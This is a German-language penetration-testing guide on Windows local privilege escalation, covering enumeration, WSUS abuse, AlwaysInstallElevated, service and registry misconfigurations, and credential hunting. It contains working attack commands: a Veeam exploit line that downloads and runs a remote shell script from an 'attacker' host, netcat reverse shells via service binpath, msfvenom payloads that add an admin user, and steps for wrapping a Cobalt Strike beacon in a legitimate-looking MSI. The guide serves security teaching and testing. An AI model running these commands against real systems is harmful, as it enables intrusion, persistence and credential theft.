# Windows Lokale Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Bestes Tool, um nach Windows local privilege escalation Vektoren zu suchen:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Erste Windows-Theorie

### Access Tokens

**Wenn du nicht weißt, was Windows Access Tokens sind, lies die folgende Seite, bevor du weitermachst:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**Sieh dir die folgende Seite für weitere Infos über ACLs - DACLs/SACLs/ACEs an:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Wenn du nicht weißt, was Integrity Levels in Windows sind, solltest du die folgende Seite lesen, bevor du weitermachst:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows Security Controls

Es gibt verschiedene Dinge in Windows, die dich **daran hindern könnten, das System zu enumerieren**, ausführbare Dateien zu starten oder sogar **deine Aktivitäten zu erkennen**. Du solltest diese **Seite** **lesen** und all diese **Verteidigungsmechanismen** **enumerieren**, bevor du mit der Privilege-Escalation-Enumeration beginnst:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

### Admin Protection / UIAccess silent elevation

UIAccess-Prozesse, die über `RAiLaunchAdminProcess` gestartet werden, können missbraucht werden, um High IL ohne Prompts zu erreichen, wenn die AppInfo secure-path checks umgangen werden. Den dedizierten UIAccess/Admin Protection bypass workflow findest du hier:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Die Accessibility-Registry-Propagation des Secure Desktop kann für einen beliebigen SYSTEM Registry-Schreibzugriff missbraucht werden (RegPwn):

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

Neuere Windows-Builds haben außerdem einen **SMB arbitrary-port** LPE-Pfad eingeführt, bei dem eine privilegierte lokale NTLM-Authentifizierung über eine wiederverwendete SMB-TCP-Verbindung reflektiert wird:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## System Info

### Version info enumeration

Prüfe, ob die Windows-Version eine bekannte Schwachstelle hat (prüfe auch die angewendeten Patches).
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Version Exploits

Diese [Site](https://msrc.microsoft.com/update-guide/vulnerability) ist praktisch, um detaillierte Informationen zu Microsoft-Sicherheitslücken zu suchen. Diese Datenbank enthält mehr als 4.700 Sicherheitslücken und zeigt die **massive Angriffsfläche**, die eine Windows-Umgebung bietet.

**Auf dem System**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas hat watson eingebettet)_

**Lokal mit Systeminformationen**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Github-Repos mit Exploits:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Environment

Sind im Env Variablen irgendwelche Credentials/Juicy Infos gespeichert?
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### PowerShell-Verlauf
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell-Transkriptdateien

Du kannst lernen, wie man dies aktiviert unter [https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/)
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

Details von PowerShell-Pipeline-Ausführungen werden aufgezeichnet, einschließlich ausgeführter Befehle, Befehlsaufrufe und Teilen von Skripten. Allerdings werden vollständige Ausführungsdetails und Ausgabeergebnisse möglicherweise nicht erfasst.

Um dies zu aktivieren, befolge die Anweisungen im Abschnitt "Transcript files" der Dokumentation und wähle **"Module Logging"** statt **"Powershell Transcription"**.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
Um die letzten 15 Ereignisse aus den PowerShell-Protokollen anzuzeigen, kannst du ausführen:
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

Eine vollständige Aktivitäts- und Inhaltsaufzeichnung der Ausführung des Skripts wird erfasst, wodurch sichergestellt wird, dass jeder Codeblock dokumentiert wird, während er ausgeführt wird. Dieser Prozess bewahrt eine umfassende Audit-Trail jeder Aktivität, was für Forensik und die Analyse bösartiger Verhaltensweisen wertvoll ist. Durch die Dokumentation aller Aktivitäten zum Zeitpunkt der Ausführung werden detaillierte Einblicke in den Prozess bereitgestellt.
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Logging-Ereignisse für den Script Block können im Windows Event Viewer unter dem Pfad gefunden werden: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**.\
Um die letzten 20 Ereignisse anzuzeigen, kannst du verwenden:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### Interneteinstellungen
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### Laufwerke
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

Du kannst das System kompromittieren, wenn die Updates nicht über http**S**, sondern über http angefordert werden.

Du beginnst damit zu prüfen, ob das Netzwerk ein nicht-SSL-WSUS-Update verwendet, indem du folgendes in cmd ausführst:
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
Oder Folgendes in PowerShell:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
Wenn Sie eine Antwort wie eine dieser erhalten:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
Und wenn `HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` oder `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` gleich `1` ist.

Dann **ist es ausnutzbar.** Wenn der letzte Registry-Wert `0` ist, dann wird der WSUS-Eintrag ignoriert.

Um diese Schwachstellen auszunutzen, kannst du Tools wie diese verwenden: [Wsuxploit](https://github.com/pimps/wsuxploit), [pyWSUS ](https://github.com/GoSecure/pywsus)- Das sind MiTM-weaponized Exploits-Skripte, um 'fake' Updates in nicht-SSL WSUS-Traffic einzuschleusen.

Lies die Research hier:

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**Lies den vollständigen Report hier**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).\
Grundsätzlich ist das der Fehler, den dieser Bug ausnutzt:

> Wenn wir die Möglichkeit haben, unseren lokalen User-Proxy zu ändern, und Windows Updates den in den Internet-Explorer-Einstellungen konfigurierten Proxy verwendet, dann haben wir folglich die Möglichkeit, [PyWSUS](https://github.com/GoSecure/pywsus) lokal auszuführen, um unseren eigenen Traffic abzufangen und Code als ein erhöhter User auf unserem Asset auszuführen.
>
> Außerdem verwendet der WSUS-Dienst, da er die Einstellungen des aktuellen Users nutzt, auch dessen Certificate Store. Wenn wir ein self-signed certificate für den WSUS-Hostnamen erzeugen und dieses Certificate in den Certificate Store des aktuellen Users hinzufügen, können wir sowohl HTTP- als auch HTTPS-WSUS-Traffic abfangen. WSUS verwendet keine HSTS-ähnlichen Mechanismen, um eine Trust-on-first-use-Art der Validierung auf dem Certificate zu implementieren. Wenn das präsentierte Certificate vom User vertraut wird und den korrekten Hostnamen hat, wird es vom Dienst akzeptiert.

Du kannst diese Schwachstelle mit dem Tool [**WSUSpicious**](https://github.com/GoSecure/wsuspicious) ausnutzen (sobald es freigegeben ist).

## Third-Party Auto-Updaters and Agent IPC (local privesc)

Viele Enterprise-Agenten stellen eine localhost-IPC-Oberfläche und einen privilegierten Update-Channel bereit. Wenn Enrollment auf einen Angreifer-Server erzwungen werden kann und der Updater einem rogue root CA oder schwachen Signaturprüfungen vertraut, kann ein lokaler User eine bösartige MSI bereitstellen, die der SYSTEM-Dienst installiert. Siehe hier eine verallgemeinerte Technik (basierend auf der Netskope stAgentSvc-Kette – CVE-2025-0309):

{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (SYSTEM via TCP 9401)

Veeam B&R < `11.0.1.1261` stellt einen localhost-Dienst auf **TCP/9401** bereit, der von Angreifern kontrollierte Nachrichten verarbeitet und dadurch beliebige Befehle als **NT AUTHORITY\SYSTEM** erlaubt.

- **Recon**: Bestätige den Listener und die Version, z. B. `netstat -ano | findstr 9401` und `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`.
- **Exploit**: Platziere ein PoC wie `VeeamHax.exe` mit den erforderlichen Veeam-DLLs im selben Verzeichnis und löse dann über den lokalen Socket ein SYSTEM-Payload aus:
```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```
Der Dienst führt den Befehl als SYSTEM aus.
## KrbRelayUp

Eine **local privilege escalation**-Schwachstelle existiert in Windows-**domain**-Umgebungen unter bestimmten Bedingungen. Diese Bedingungen umfassen Umgebungen, in denen **LDAP signing nicht erzwungen** wird, Benutzer über Selbstrechte verfügen, die es ihnen erlauben, **Resource-Based Constrained Delegation (RBCD)** zu konfigurieren, und die Fähigkeit besitzen, Computer innerhalb der Domain zu erstellen. Wichtig ist, dass diese **Anforderungen** mit den **Default settings** erfüllt werden.

Finde den **exploit in** [**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp)

Für weitere Informationen über den Ablauf des Angriffs siehe [https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)

## AlwaysInstallElevated

**Wenn** diese 2 Register aktiviert sind (Wert ist **0x1**), dann können Benutzer mit jeder Berechtigung `*.msi`-Dateien als NT AUTHORITY\\**SYSTEM** **installieren** (ausführen).
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit-Payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
Wenn du eine meterpreter session hast, kannst du diese Technik mit dem Modul **`exploit/windows/local/always_install_elevated`** automatisieren

### PowerUP

Verwende den `Write-UserAddMSI`-Befehl aus power-up, um im aktuellen Verzeichnis eine Windows MSI binary zu erstellen, um Privilegien zu erhöhen. Dieses Skript schreibt ein vorcompiliertes MSI-Installationspaket heraus, das nach dem Hinzufügen eines users/groups fragt (du benötigst also GIU-Zugriff):
```
Write-UserAddMSI
```
Führe einfach die erstellte Binärdatei aus, um Privilegien zu eskalieren.

### MSI Wrapper

Lies dieses Tutorial, um zu lernen, wie man mit diesem Tool einen MSI Wrapper erstellt. Beachte, dass du eine "**.bat**"-Datei wrappen kannst, wenn du nur **Befehlszeilen** **ausführen** willst


{{#ref}}
msi-wrapper.md
{{#endref}}

### Erstelle MSI mit WIX


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Erstelle MSI mit Visual Studio

- **Generiere** mit Cobalt Strike oder Metasploit ein **neues Windows EXE TCP payload** in `C:\privesc\beacon.exe`
- Öffne **Visual Studio**, wähle **Create a new project** und gib "installer" in das Suchfeld ein. Wähle das **Setup Wizard**-Projekt und klicke auf **Next**.
- Gib dem Projekt einen Namen, wie **AlwaysPrivesc**, verwende **`C:\privesc`** als Speicherort, wähle **place solution and project in the same directory**, und klicke auf **Create**.
- Klicke weiter auf **Next**, bis du zu Schritt 3 von 4 kommst (choose files to include). Klicke auf **Add** und wähle das Beacon payload aus, das du gerade generiert hast. Dann klicke auf **Finish**.
- Markiere das **AlwaysPrivesc**-Projekt im **Solution Explorer** und ändere in den **Properties** **TargetPlatform** von **x86** auf **x64**.
- Es gibt weitere Eigenschaften, die du ändern kannst, wie **Author** und **Manufacturer**, wodurch die installierte App legitimer wirken kann.
- Rechtsklicke auf das Projekt und wähle **View > Custom Actions**.
- Rechtsklicke auf **Install** und wähle **Add Custom Action**.
- Doppelklicke auf **Application Folder**, wähle deine **beacon.exe**-Datei aus und klicke auf **OK**. Dadurch wird sichergestellt, dass das beacon payload ausgeführt wird, sobald der Installer gestartet wird.
- Unter den **Custom Action Properties** ändere **Run64Bit** auf **True**.
- Schließlich **build it**.
- Wenn die Warnung `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` angezeigt wird, stelle sicher, dass du die Plattform auf x64 gesetzt hast.

### MSI Installation

Um die **Installation** der bösartigen `.msi`-Datei im **Hintergrund** auszuführen:
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
Um diese Schwachstelle auszunutzen, kannst du verwenden: _exploit/windows/local/always_install_elevated_

## Antivirus and Detectors

### Audit Settings

Diese Einstellungen entscheiden darüber, was **protokolliert** wird, also solltest du darauf achten
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwarding ist interessant, um zu wissen, wohin die Logs gesendet werden.
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** ist für die **Verwaltung lokaler Administratorpasswörter** konzipiert und stellt sicher, dass jedes Passwort **einzigartig, zufällig und regelmäßig aktualisiert** wird auf Computern, die einer Domäne beigetreten sind. Diese Passwörter werden sicher in Active Directory gespeichert und können nur von Benutzern abgerufen werden, denen über ACLs ausreichende Berechtigungen gewährt wurden, sodass sie lokale Admin-Passwörter ansehen können, wenn sie autorisiert sind.


{{#ref}}
../active-directory-methodology/laps.md
{{endref}}

### WDigest

Wenn aktiv, werden **Klartextpasswörter in LSASS** (Local Security Authority Subsystem Service) gespeichert.\
[**Mehr Informationen über WDigest auf dieser Seite**](../stealing-credentials/credentials-protections.md#wdigest).
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA-Schutz

Beginnend mit **Windows 8.1** führte Microsoft einen verbesserten Schutz für die Local Security Authority (LSA) ein, um Versuche nicht vertrauenswürdiger Prozesse zu **blockieren**, **seinen Speicher zu lesen** oder Code einzuschleusen, und so das System weiter abzusichern.\
[**Mehr Infos zu LSA-Schutz hier**](../stealing-credentials/credentials-protections.md#lsa-protection).
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** wurde in **Windows 10** eingeführt. Sein Zweck ist es, die auf einem Gerät gespeicherten Anmeldedaten vor Bedrohungen wie pass-the-hash attacks zu schützen.| [**More info about Credentials Guard here.**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Zwischengespeicherte Anmeldeinformationen

**Domänenanmeldeinformationen** werden von der **Local Security Authority** (LSA) authentifiziert und von Betriebssystemkomponenten verwendet. Wenn die Anmeldedaten eines Benutzers von einem registrierten Security Package authentifiziert werden, werden in der Regel Domänenanmeldeinformationen für den Benutzer eingerichtet.\
[**Mehr Infos über Cached Credentials hier**](../stealing-credentials/credentials-protections.md#cached-credentials).
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## Benutzer & Gruppen

### Benutzer & Gruppen auflisten

Du solltest prüfen, ob eine der Gruppen, denen du angehörst, interessante Berechtigungen hat
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### Privileged groups

Wenn du **einer privilegierten Gruppe angehörst, kannst du möglicherweise Privilegien eskalieren**. Erfahre hier mehr über privilegierte Gruppen und wie man sie ausnutzt, um Privilegien zu eskalieren:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipulation

**Erfahre mehr** darüber, was ein **token** ist, auf dieser Seite: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens).\
Sieh dir die folgende Seite an, um **mehr über interessante tokens** zu erfahren und wie man sie ausnutzt:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### Logged users / Sessions
```bash
qwinsta
klist sessions
```
### Home-Ordner
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### Kennwortrichtlinie
```bash
net accounts
```
### Den Inhalt der Zwischenablage abrufen
```bash
powershell -command "Get-Clipboard"
```
## Laufende Prozesse

### Datei- und Ordnerberechtigungen

Als Erstes: Wenn du die Prozesse auflistest, **prüfe die Befehlszeile des Prozesses auf Passwörter**.\
Prüfe, ob du **ein laufendes Binary überschreiben** kannst oder ob du Schreibrechte auf den Binary-Ordner hast, um mögliche [**DLL Hijacking attacks**](dll-hijacking/index.html) auszunutzen:
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
Immer nach möglichen [**electron/cef/chromium debuggers** laufenden Prozessen suchen, du könntest dies missbrauchen, um Rechte zu erhöhen](../../linux-hardening/privilege-escalation/electron-cef-chromium-debugger-abuse.md).

**Berechtigungen der Prozess-Binaries prüfen**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**Überprüfen der Berechtigungen der Ordner der Prozess-Binaries (**[**DLL Hijacking**](dll-hijacking/index.html)**)**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### Memory Password mining

Du kannst mit **procdump** von sysinternals einen Memory Dump eines laufenden Prozesses erstellen. Dienste wie FTP haben die **credentials im Klartext im Speicher**, versuche, den Speicher zu dumpen und die credentials auszulesen.
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Unsichere GUI-Apps

**Als SYSTEM ausgeführte Anwendungen können einem Benutzer erlauben, eine CMD zu starten oder Verzeichnisse zu durchsuchen.**

Beispiel: "Windows Help and Support" (Windows + F1), suche nach "command prompt", klicke auf "Click to open Command Prompt"

## Dienste

Service Triggers ermöglichen Windows, einen Dienst zu starten, wenn bestimmte Bedingungen eintreten (Named-Pipe/RPC-Endpoint-Aktivität, ETW-Events, IP-Verfügbarkeit, Geräteankunft, GPO-Refresh usw.). Selbst ohne SERVICE_START-Rechte kann man oft privilegierte Dienste starten, indem man ihre Trigger auslöst. Siehe Aufzählungs- und Aktivierungstechniken hier:

-
{{#ref}}
service-triggers.md
{{#endref}}

Erhalte eine Liste von Diensten:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### Berechtigungen

Du kannst **sc** verwenden, um Informationen über einen Dienst zu erhalten
```bash
sc qc <service_name>
```
Es wird empfohlen, die Binärdatei **accesschk** von _Sysinternals_ zu verwenden, um die erforderliche Berechtigungsstufe für jeden Dienst zu überprüfen.
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
Es wird empfohlen zu prüfen, ob "Authenticated Users" irgendeinen Dienst ändern können:
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[You can download accesschk.exe for XP for here](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### Dienst aktivieren

Wenn du diesen Fehler hast (zum Beispiel bei SSDPSRV):

_Systemfehler 1058 ist aufgetreten._\
_Der Dienst kann nicht gestartet werden, entweder weil er deaktiviert ist oder weil ihm keine aktivierten Geräte zugeordnet sind._

Du kannst ihn aktivieren mit
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**Berücksichtige, dass der Dienst upnphost für XP SP1 von SSDPSRV abhängt, um zu funktionieren**

**Eine weitere Workaround** für dieses Problem ist das Ausführen von:
```
sc.exe config usosvc start= auto
```
### **Ändern des Dienst-Binary-Pfads**

In dem Szenario, in dem die Gruppe "Authenticated users" über **SERVICE_ALL_ACCESS** für einen Dienst verfügt, ist eine Änderung des ausführbaren Binaries des Dienstes möglich. Um **sc** zu ändern und auszuführen:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### Dienst neu starten
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
Privilegien können durch verschiedene Berechtigungen erhöht werden:

- **SERVICE_CHANGE_CONFIG**: Erlaubt die Neukonfiguration des Service-Binaries.
- **WRITE_DAC**: Ermöglicht die Neukonfiguration von Berechtigungen, was dazu führt, dass Service-Konfigurationen geändert werden können.
- **WRITE_OWNER**: Erlaubt das Übernehmen des Besitzes und die Neukonfiguration von Berechtigungen.
- **GENERIC_WRITE**: Erbt die Fähigkeit, Service-Konfigurationen zu ändern.
- **GENERIC_ALL**: Erbt ebenfalls die Fähigkeit, Service-Konfigurationen zu ändern.

Für die Erkennung und Ausnutzung dieser Schwachstelle kann **_exploit/windows/local/service_permissions_** verwendet werden.

### Services binaries weak permissions

Wenn ein Service als **`LocalSystem`**, **`LocalService`**, **`NetworkService`** oder ein privilegiertes Domänenkonto läuft, aber **Benutzer mit niedrigen Rechten die Service-EXE oder deren übergeordneten Ordner ändern können**, kann der Service oft durch **Ersetzen des Binaries und Neustarten des Services** übernommen werden.

**Prüfe, ob du das Binary ändern kannst, das von einem Service ausgeführt wird**, oder ob du **Schreibrechte auf den Ordner** hast, in dem sich das Binary befindet ([**DLL Hijacking**](dll-hijacking/index.html))**.**\
Du kannst jedes Binary, das von einem Service ausgeführt wird, mit **wmic** ermitteln (nicht in system32) und deine Berechtigungen mit **icacls** prüfen:
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
Du kannst auch **sc** und **icacls** verwenden:
```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
Suche nach gefährlichen ACLs, die **`Everyone`**, **`BUILTIN\Users`** oder **`Authenticated Users`** gewährt wurden, insbesondere **`(F)`**, **`(M)`** oder **`(W)`** auf der Service-Executable oder auf dem Verzeichnis, das sie enthält. Ein praktischer Abuse-Flow ist:

1. Bestätige das Service-Account und den Executable-Pfad mit `sc qc <service_name>`.
2. Bestätige, dass das Binary mit `icacls <path>` beschreibbar ist.
3. Ersetze das Service-Binary durch ein Payload oder ein gültiges bösartiges Service-Binary.
4. Starte den Service mit `sc stop <service_name> && sc start <service_name>` neu (oder warte auf einen Reboot / Service-Trigger).

Nützliche automatisierte Checks:
```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```
> Wenn der Dienst einem normalen Benutzer nicht erlaubt, ihn neu zu starten, prüfe, ob er automatisch beim Booten startet, eine Fehleraktion hat, die ihn erneut startet, oder indirekt durch die Anwendung ausgelöst werden kann.

### Berechtigungen zum Ändern der Service-Registry

Du solltest prüfen, ob du eine Service-Registry ändern kannst.\
Du kannst deine **Berechtigungen** für eine **Service-Registry** **prüfen**, indem du:
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
Es sollte überprüft werden, ob **Authenticated Users** oder **NT AUTHORITY\INTERACTIVE** über `FullControl`-Berechtigungen verfügen. Falls ja, kann die vom Service ausgeführte Binary geändert werden.

Um den Path der ausgeführten Binary zu ändern:
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### Registry-Symlink-Race zu beliebigem HKLM-Wert-Schreiben (ATConfig)

Einige Windows-Accessibility-Features erstellen pro Benutzer **ATConfig**-Keys, die später von einem **SYSTEM**-Prozess in einen HKLM-Session-Key kopiert werden. Ein Registry-**symbolic link race** kann diesen privilegierten Write in **jeden HKLM-Pfad** umleiten und so eine Primitive für beliebiges HKLM-**value write** bereitstellen.

Wichtige Orte (Beispiel: On-Screen Keyboard `osk`):

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` listet installierte Accessibility-Features.
